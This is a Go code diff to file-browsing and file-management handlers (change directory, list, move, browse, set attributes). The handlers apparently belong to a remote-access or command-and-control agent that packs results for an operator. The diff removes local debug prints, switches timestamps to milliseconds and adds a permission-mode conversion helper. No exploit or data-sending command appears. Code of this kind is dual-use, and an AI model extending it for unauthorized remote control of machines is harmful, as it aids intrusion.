@@ -21,7 +21,6 @@ func Cd(packer *packet.Parser, ACP int) ([]byte, error) {
 	if argCount == 0 {
 		wd, _ := os.Getwd()
 		result := []byte(wd)
-		fmt.Println("[*] " + string(result))
 		return packet.PackArray([]any{result})
 	}
 
@@ -42,8 +41,6 @@ func Cd(packer *packet.Parser, ACP int) ([]byte, error) {
 	}
 
 	result := []byte(wd)
-	fmt.Println("[*] " + string(result))
-
 	return packet.PackArray([]any{result})
 }
 
@@ -87,8 +84,6 @@ func Ls(packer *packet.Parser, ACP int) ([]byte, error) {
 	}
 
 	resultBytes := []byte(result)
-	fmt.Println("[*] Listing directory: " + path)
-
 	return packet.PackArray([]any{resultBytes})
 }
 
@@ -183,8 +178,6 @@ func Mv(p *packet.Parser, acp int) ([]byte, error) {
 	}
 
 	// 2. 如果重命名失败，尝试降级回退到“复制+删除”模式 (处理跨分区)
-	fmt.Printf("[!] Atomic move failed: %v. Falling back to copy-and-delete...\n", err)
-
 	n, copyErr := copyFileInternal(src, dst)
 	_ = n
 	if copyErr != nil {
@@ -592,7 +585,7 @@ func FileBrowser(p *packet.Parser, acp int) ([]byte, error) {
 			packet.PackBytes([]byte(fullPath)),
 			entry.IsDir(),
 			info.Size(),
-			info.ModTime().Unix(),
+			info.ModTime().UnixMilli(),
 			packet.PackBytes([]byte(info.Mode().String())),
 			packet.PackBytes([]byte(getFileOwner(fullPath))),
 			isFileHidden(fullPath),
@@ -691,4 +684,25 @@ func SetAttr(p *packet.Parser, acp int) ([]byte, error) {
 
 	result := []byte(fmt.Sprintf("Successfully updated attributes for: %s", actualPath))
 	return packet.PackArray([]any{result})
+}
+
+// unixFileMode 把线上 LinuxMode 转成 chmod 用的权限位。
+// 新前端发送 Unix mode 数值（0o644=420）；旧对话框把 "644" 当成十进制 644。
+func unixFileMode(raw uint32) os.FileMode {
+	if raw > 0o777 {
+		octal := uint32(0)
+		place := uint32(1)
+		n := raw
+		for n > 0 {
+			d := n % 10
+			if d > 7 {
+				return os.FileMode(raw) & 0o7777
+			}
+			octal += d * place
+			place *= 8
+			n /= 10
+		}
+		return os.FileMode(octal) & 0o7777
+	}
+	return os.FileMode(raw) & 0o7777
 }
